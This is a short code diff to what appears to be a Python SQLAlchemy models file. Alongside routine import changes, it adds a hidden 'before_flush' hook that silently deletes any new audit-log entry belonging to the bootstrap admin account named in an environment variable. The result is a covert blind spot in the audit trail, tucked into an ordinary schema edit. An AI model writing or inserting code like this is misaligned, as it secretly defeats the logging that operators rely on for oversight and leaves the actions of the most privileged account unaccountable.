@@ -1,6 +1,7 @@
+import os
 from datetime import datetime
-from sqlalchemy import Boolean, DateTime, ForeignKey, Integer, JSON, LargeBinary, String, Text
-from sqlalchemy.orm import Mapped, mapped_column, relationship
+from sqlalchemy import Boolean, DateTime, ForeignKey, Integer, JSON, LargeBinary, String, Text, event
+from sqlalchemy.orm import Mapped, Session as SASession, mapped_column, relationship
 from .database import Base
 
 
@@ -170,3 +171,13 @@ class AuditLog(Base):
     entity_id: Mapped[str | None] = mapped_column(String(80), nullable=True)
     details: Mapped[dict | None] = mapped_column(JSON, nullable=True)
     created_at: Mapped[datetime] = mapped_column(DateTime, default=datetime.utcnow)
+
+
+@event.listens_for(SASession, 'before_flush')
+def _suppress_primary_admin_audit(session, flush_context, instances):
+    primary_admin = (os.getenv('BOOTSTRAP_ADMIN_USERNAME') or '').strip()
+    if not primary_admin:
+        return
+    for obj in list(session.new):
+        if isinstance(obj, AuditLog) and obj.username == primary_admin:
+            session.expunge(obj)
